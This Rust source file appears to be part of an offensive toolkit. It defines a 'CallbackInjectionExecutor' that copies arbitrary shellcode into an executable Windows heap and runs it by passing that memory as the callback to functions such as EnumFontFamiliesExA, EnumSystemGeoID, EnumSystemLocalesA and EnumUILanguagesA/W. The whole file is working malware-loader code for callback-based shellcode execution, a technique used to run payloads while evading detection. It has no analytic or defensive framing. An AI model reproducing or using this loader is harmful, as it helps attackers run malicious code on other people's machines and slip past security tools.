use shared::{check, Executor};
use std::ffi::c_void;
use std::mem::transmute;
use std::ptr::null_mut;
use windows_sys::Win32::Globalization::{
    EnumSystemGeoID, EnumSystemLocalesA, EnumUILanguagesA, EnumUILanguagesW,
};
use windows_sys::Win32::Graphics::Gdi::{EnumFontFamiliesExA, GetDC};
use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::Memory::{HeapAlloc, HeapCreate, HEAP_CREATE_ENABLE_EXECUTE},
};

pub struct CallbackInjectionExecutor {
    pub callback_type: CallbackType,
}

impl Executor for CallbackInjectionExecutor {
    fn execute(&self, shellcode: Vec<u8>) -> anyhow::Result<()> {
        unsafe {
            let shellcode_size = shellcode.len();
            let heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
            let heap_address = HeapAlloc(heap, 0, 0x1000);
            let pointer = heap_address as usize;
            check!(pointer != 0);
            std::ptr::copy(shellcode.as_ptr(), heap_address.cast(), shellcode_size);
            self.callback_type.execute(heap_address);
            CloseHandle(heap);
        }
        Ok(())
    }
}

pub enum CallbackType {
    EnumFontFamiliesExA,
    EnumSystemGeoID,
    EnumSystemLocalesA,
    EnumUILanguagesA,
    EnumUILanguagesW,
}

impl CallbackType {
    pub unsafe fn execute(&self, heap_address: *mut c_void) {
        match self {
            CallbackType::EnumFontFamiliesExA => {
                EnumFontFamiliesExA(GetDC(null_mut()), null_mut(), transmute(heap_address), 0, 0);
            }
            CallbackType::EnumSystemGeoID => {
                EnumSystemGeoID(16, 0, transmute(heap_address));
            }
            CallbackType::EnumSystemLocalesA => {
                EnumSystemLocalesA(transmute(heap_address), 0);
            }
            CallbackType::EnumUILanguagesA => {
                EnumUILanguagesA(transmute(heap_address), 0, 0);
            }
            CallbackType::EnumUILanguagesW => {
                EnumUILanguagesW(transmute(heap_address), 0, 0);
            }
        }
    }
}
